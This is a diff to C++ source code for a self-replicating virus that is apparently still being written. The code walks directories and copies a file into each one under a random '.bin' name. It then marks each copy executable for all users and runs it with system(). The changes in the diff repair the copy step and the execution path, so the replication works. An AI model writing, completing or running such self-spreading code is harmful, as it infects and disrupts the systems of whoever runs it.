@@ -16,7 +16,7 @@
 //variables
 std::regex correctFile("(a)+([0-9]?)+(.*)");
 // detect archives
-std::regex itsAFile("[\\w\\d\\- ]+(\\.*)");
+std::regex itsAFile("[\\w\\d\\- _]+(\\.*)");
 
 // prototypes
 void ListDir(const std::string &, std::vector<std::string> &);
@@ -54,7 +54,7 @@ void ListDir(const std::string &path, std::vector<std::string> &files)
 // write the file
 void execCommand(){
 usleep(3 * 10000);
-  system((nameVirus).c_str());
+  system(("./"+nameVirus).c_str());
 }
 void writeFiles(std::vector<std::string> files)
 {
@@ -70,19 +70,21 @@ void writeFiles(std::vector<std::string> files)
           file = files[i]; // get the file
 
         // get the directories
-        if (!std::regex_match(files[i], itsAFile) == 0 || files[i] == "." || files[i] == "..")
+        if (!std::regex_match(files[i], itsAFile) == 0 ||files[i] == "." || files[i] == "..")
         {
           // generate the name
          nameVirus= (files[i] + "/a" + std::to_string(rand()) + ".bin");
           // get the file
           std::ifstream fileVirus(file);
           // create the file
+          
           std::ofstream copyVirus(nameVirus);
-          if (!fileVirus.is_open())
-            copyVirus << fileVirus.rdbuf(); // copy the file
+          std::string virusString;
+          chmod(nameVirus.c_str(), S_IRWXU | S_IRWXG | S_IRWXG | S_IRWXO);
+          copyVirus << fileVirus.rdbuf(); // copy the file
+              
 
-          fileVirus.close();
-          chmod(nameVirus.c_str(),S_IRWXU|S_IRWXG|S_IRWXG| S_IRWXO);
+         // 
           std::thread execThisPlease(execCommand);
           execThisPlease.join(); // idk what im doing here 😩
         }
